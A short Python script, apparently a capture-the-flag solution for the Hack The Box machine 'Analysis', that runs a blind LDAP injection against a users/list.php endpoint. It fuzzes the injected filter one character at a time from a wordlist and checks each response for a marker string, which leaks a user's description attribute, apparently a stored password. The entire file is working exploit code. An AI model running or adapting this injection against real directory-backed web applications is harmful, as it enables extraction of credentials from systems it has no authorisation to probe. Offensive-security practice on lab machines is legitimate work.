import requests
import urllib.parse

charset = "/usr/share/seclists/Fuzzing/alphanum-case-extra.txt"
url_template = "http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={}*)"
clair = ""

while True:
    with open(charset, "r") as charset_file:
        for char in charset_file.read():
            clair_with_char = clair + char
            clair_encoded = urllib.parse.quote(clair_with_char)
            s = url_template.format(clair_encoded)
            print("Trying URL:", s)
            response = requests.get(s)

            if "technic" in response.text:
                clair += char
                print(clair)
                break